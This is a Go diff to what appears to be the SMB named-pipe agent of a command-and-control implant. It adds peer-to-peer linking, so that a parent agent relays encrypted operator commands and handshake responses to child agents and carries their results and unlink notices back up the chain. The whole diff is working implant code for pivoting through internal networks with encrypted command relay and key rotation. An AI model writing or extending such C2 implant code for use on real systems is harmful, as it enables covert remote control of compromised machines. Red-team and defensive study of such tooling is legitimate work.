@@ -209,11 +209,45 @@ func handleServerData(conn *PipeConnection, encryptedPayload string) {
 
 	log.Printf("[SMB] Decrypted payload: %s", decrypted)
 
-	// Add commands to queue
-	if err := commandQueue.AddCommands(decrypted); err != nil {
-		log.Printf("[SMB] Failed to add commands: %v", err)
-		logDebug("Failed to add commands: %v", err)
-		return
+	// Parse as JSON to check for nested link commands
+	var payloadData map[string]interface{}
+	if err := json.Unmarshal([]byte(decrypted), &payloadData); err != nil {
+		// Legacy format - just commands array
+		if err := commandQueue.AddCommands(decrypted); err != nil {
+			log.Printf("[SMB] Failed to add commands: %v", err)
+			logDebug("Failed to add commands: %v", err)
+			return
+		}
+	} else {
+		// New format - may have commands and/or link data
+
+		// Process handshake responses for child agents FIRST (before commands)
+		if linkRespVal, ok := payloadData["lr"]; ok {
+			if linkRespData, ok := linkRespVal.([]interface{}); ok {
+				log.Printf("[SMB LinkManager] Processing %d handshake responses for child agents", len(linkRespData))
+				processLinkHandshakeResponses(linkRespData)
+			}
+		}
+
+		// Process link commands for child agents (forward to linked SMB agents)
+		if linkCmdsVal, ok := payloadData["lc"]; ok {
+			if linkCmdsData, ok := linkCmdsVal.([]interface{}); ok {
+				log.Printf("[SMB LinkManager] Processing %d link commands for child agents", len(linkCmdsData))
+				processLinkCommands(linkCmdsData)
+			}
+		}
+
+		// Extract commands array if present
+		if cmdsVal, ok := payloadData["commands"]; ok {
+			cmdsJSON, err := json.Marshal(cmdsVal)
+			if err == nil {
+				if err := commandQueue.AddCommands(string(cmdsJSON)); err != nil {
+					log.Printf("[SMB] Failed to add commands: %v", err)
+				}
+			}
+		}
+		// Note: If payload has lr/lc fields but no commands, that's valid (just forwarding to children)
+		// Don't try to parse as legacy format - that would fail on the JSON object
 	}
 
 	log.Printf("[SMB] Commands added to queue, processing...")
@@ -239,14 +273,39 @@ func handleServerData(conn *PipeConnection, encryptedPayload string) {
 
 	log.Printf("[SMB] Processed %d commands, checking for results to send", processedCount)
 
-	// Send results back
-	if resultManager.HasResults() {
+	// Collect link data from child SMB agents (if any)
+	lm := GetLinkManager()
+	linkData := lm.GetOutboundData()
+	unlinkNotifications := lm.GetUnlinkNotifications()
+
+	hasResults := resultManager.HasResults()
+	hasLinkData := len(linkData) > 0
+	hasUnlinkNotifications := len(unlinkNotifications) > 0
+
+	// Send results back (including any link data from child agents)
+	if hasResults || hasLinkData || hasUnlinkNotifications {
 		results := resultManager.GetPendingResults()
-		log.Printf("[SMB] Sending %d results back to HTTPS agent", len(results))
+		log.Printf("[SMB] Sending %d results back to parent (linkData=%d, unlinkNotifications=%d)",
+			len(results), len(linkData), len(unlinkNotifications))
 
 		payload := map[string]interface{}{
 			"agent_id": clientID,
-			"results":  results,
+		}
+
+		if len(results) > 0 {
+			payload["results"] = results
+		}
+
+		// Include link data from child agents (to be forwarded up the chain)
+		if hasLinkData {
+			log.Printf("[SMB LinkManager] Including %d link data items in response to parent", len(linkData))
+			payload["ld"] = linkData
+		}
+
+		// Include unlink notifications from child agents
+		if hasUnlinkNotifications {
+			log.Printf("[SMB LinkManager] Including %d unlink notifications in response to parent", len(unlinkNotifications))
+			payload["lu"] = unlinkNotifications
 		}
 
 		jsonData, err := json.Marshal(payload)
@@ -283,6 +342,26 @@ func handleServerData(conn *PipeConnection, encryptedPayload string) {
 		log.Printf("[SMB] Secret rotated")
 	} else {
 		log.Printf("[SMB] No results to send")
+		// Still need to send an empty response so parent knows we're done
+		// and can proceed with the next command cycle
+		emptyPayload := map[string]interface{}{
+			"agent_id": clientID,
+		}
+		jsonData, _ := json.Marshal(emptyPayload)
+		encrypted, err := secureComms.EncryptMessage(string(jsonData))
+		if err != nil {
+			log.Printf("[SMB] Failed to encrypt empty response: %v", err)
+			return
+		}
+		response := map[string]string{
+			"type":    "data",
+			"payload": encrypted,
+		}
+		respJSON, _ := json.Marshal(response)
+		if err := conn.WriteMessage(respJSON); err != nil {
+			log.Printf("[SMB] Failed to send empty response: %v", err)
+		}
+		secureComms.RotateSecret()
 	}
 }
 
@@ -295,5 +374,85 @@ func handleHandshakeResponse(conn *PipeConnection, payload string) {
 func logDebug(format string, v ...interface{}) {
 	if debugMode == "true" {
 		log.Printf(format, v...)
+	}
+}
+
+// processLinkCommands forwards commands from parent to linked (child) SMB agents
+func processLinkCommands(linkCmds []interface{}) {
+	lm := GetLinkManager()
+
+	for _, cmd := range linkCmds {
+		cmdMap, ok := cmd.(map[string]interface{})
+		if !ok {
+			log.Printf("[SMB LinkManager] Invalid link command format")
+			continue
+		}
+
+		routingID, _ := cmdMap["r"].(string)
+		payload, _ := cmdMap["p"].(string)
+
+		if routingID == "" || payload == "" {
+			log.Printf("[SMB LinkManager] Missing routing_id or payload in link command")
+			continue
+		}
+
+		// Forward to the linked agent
+		if err := lm.ForwardToLinkedAgent(routingID, payload); err != nil {
+			log.Printf("[SMB LinkManager] Failed to forward command to %s: %v", routingID, err)
+			continue
+		}
+
+		log.Printf("[SMB LinkManager] Forwarded command to linked agent %s", routingID)
+	}
+}
+
+// processLinkHandshakeResponses forwards handshake responses from parent to child SMB agents
+func processLinkHandshakeResponses(linkResps []interface{}) {
+	lm := GetLinkManager()
+
+	for _, resp := range linkResps {
+		respMap, ok := resp.(map[string]interface{})
+		if !ok {
+			log.Printf("[SMB LinkManager] Invalid handshake response format")
+			continue
+		}
+
+		routingID, _ := respMap["r"].(string)
+		payload, _ := respMap["p"].(string)
+
+		if routingID == "" || payload == "" {
+			log.Printf("[SMB LinkManager] Missing routing_id or payload in handshake response")
+			continue
+		}
+
+		// Get the link
+		link, exists := lm.GetLink(routingID)
+		if !exists {
+			log.Printf("[SMB LinkManager] No link found for routing_id %s", routingID)
+			continue
+		}
+
+		// Send handshake response to child SMB agent
+		message := map[string]string{
+			"type":    "handshake_response",
+			"payload": payload,
+		}
+
+		msgJSON, err := json.Marshal(message)
+		if err != nil {
+			log.Printf("[SMB LinkManager] Failed to marshal handshake response: %v", err)
+			continue
+		}
+
+		link.mu.Lock()
+		err = writeMessage(link.Conn, msgJSON)
+		link.mu.Unlock()
+
+		if err != nil {
+			log.Printf("[SMB LinkManager] Failed to send handshake response to %s: %v", routingID, err)
+			continue
+		}
+
+		log.Printf("[SMB LinkManager] Sent handshake response to linked agent %s", routingID)
 	}
 }
